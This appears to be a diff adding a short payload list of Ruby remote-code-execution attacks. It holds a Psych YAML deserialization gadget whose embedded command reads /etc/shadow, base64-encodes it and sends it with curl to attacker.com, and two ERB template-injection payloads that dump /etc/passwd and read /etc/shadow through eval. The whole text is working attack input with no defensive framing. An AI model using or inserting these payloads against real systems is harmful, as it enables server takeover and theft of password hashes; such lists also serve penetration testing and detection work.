@@ -1,0 +1,11 @@
+# Ruby - Psych YAML RCE
+--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection
+? !ruby/object:OpenStruct
+  table:
+    :defaults:
+      :action: "system('cat /etc/shadow|base64|curl attacker.com -d @-')"
+: !ruby/object:ActionController::Routing::RouteSet::NamedRouteCollection
+# Ruby - ERB template injection RCE
+<%= system('cat /etc/passwd') %>
+# Ruby - ERB.new 对象注入 RCE
+<%= eval("File.read('/etc/shadow')") %>
